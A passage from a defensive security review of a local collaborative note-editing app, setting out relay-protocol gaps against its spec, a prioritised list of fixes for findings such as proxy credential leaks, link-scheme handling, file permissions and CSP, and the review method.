| Home/store process locks; fail-closed discovery upgrades | `discovery.rs`, `lib.rs` ensure_daemon |
| Frontend suggestion/explanation/title rendering uses `textContent` | `suggestions.ts`, `main.ts` |

---

## 5. Relay / M3 readiness (not shipped, still in this repo’s protocol)

The live codec in `crates/thoughtd/src/sync.rs` is explicitly “the relay protocol from §5.” Shipping M3 on it **as-is** would fail the documented share model:

| Spec (AD-7 / §5) | Code today |
|---|---|
| `SUBSCRIBE { doc_id, share_id, state_vector }` | `share_id` absent; join = bearer + `doc_id` |
| Secret never leaves the URL fragment | No join handler; no `thought://` registration |
| Relay never learns `secret` | N/A |
| Per-share isolation | One bearer sees all docs |
| Awareness ephemeral | True |
| Actor on `UPDATE` | Forced `human:editor`; no wire actor |
| E2E | None, honestly documented |

Do not describe the future relay as private. Do not add an “encrypted” flag that the protocol does not implement (AD-7).

---

## 6. Priority order

**Do now (wrong participant / integrity / credential theft):**

1. Filter reviewer `list_suggestions` (and likely lineage/provenance/actors) to the caller’s connection — **H1**.
2. Disable env proxies on `thought-mcp-stdio` (reuse `local_agent()`); add an `HTTP_PROXY` leak test — **H7**.
3. Fix `AGENTS.md` so it matches AD-15 — **H2**.
4. Allowlist link schemes at parse, schema, and `openUrl` — **H4**.
5. `chmod 0700` `THOUGHT_HOME` and `0600` the DB/logs — **H6**.
6. Cap `/sync` frames; do not create channels for unknown docs; cap XML depth — **M3 / M12**.
7. Gate `claude.yml` the same way as the review workflow — **M10**.
8. Add a transport test: reviewer `replace_block` is denied — **M8**.
9. Re-validate suggestion patch nodes on accept; ignore `suggestions` keys on generic `Update` — **H3**.

**Before any share/relay work:**

10. Mandatory `share_id` on Subscribe; never authorize by `doc_id` alone — **H3 / M9**.
11. Schema-validate (or map-filter) peer Yjs updates; stop writing suggestions through generic `Update` — **H3**.
12. Treat wire actor descriptors as reported; keep secrets out of argv/logs — **M6 / M9**.
13. Relay URL allowlist (`wss:` / `https:` only, no private/link-local unless explicitly loopback) — **M9**.

**Defense in depth:**

14. Drop `withGlobalTauri`; tighten CSP; keep the bearer out of JS if possible — **H5**.
15. Check WebSocket `Origin`; filter awareness client ids — **M11 / M13**.
16. Phrase-quote FTS queries — **M5**.
17. Narrow CORS origins — **M4**.
18. `proxy(None)` on provider chat unless a proxy is an explicit product choice — **H7**.

---

## 7. Method

Reviewed as a hostile reader of the trust boundaries in `AGENTS.md` / `docs/architecture.md`, then the implementation:

- Daemon: bind, discovery, CORS, MCP vs editor vs sync auth (`crates/thoughtd/`).
- Reviewer registry and MCP tool gating (`connections.rs`, `tools.rs`, `thought-mcp`).
- CRDT commit paths (`apply_peer_update` vs `parse_blocks` vs suggestions).
- Store: SQL, FTS, WAL, file modes.
- Tauri IPC, CSP, opener, credentials, pro-chat.
- Frontend: links, suggestions, search, token handling.
- Workflows: `ci.yml`, `release.yml`, `claude.yml`, `claude-code-review.yml`.

Exploratory agents mapped surfaces; every High/Medium finding was re-read in source at the cited lines.

The second pass re-checked: ureq proxy defaults vs `discovery::local_agent`, stdio shim request construction, WebSocket vs CORS, suggestion accept vs schema, Yjs `read_children` recursion, awareness fanout, provider TLS/redirects/attachment magic bytes, Tauri opener/CSP, and CI association gates. Ordinary unit tests were not re-run; this review did not change runtime code.

---

## 8. Out of scope / non-goals respected

MVP non-goals (folders, accounts, E2E, mobile, plugins, history UI, `.md` mirroring) were not treated as missing features. “No E2E” is recorded as AD-7, not as an accidental omission. Same-user access to owner files is AD-21, not a CVSS-style “local privilege escalation.”
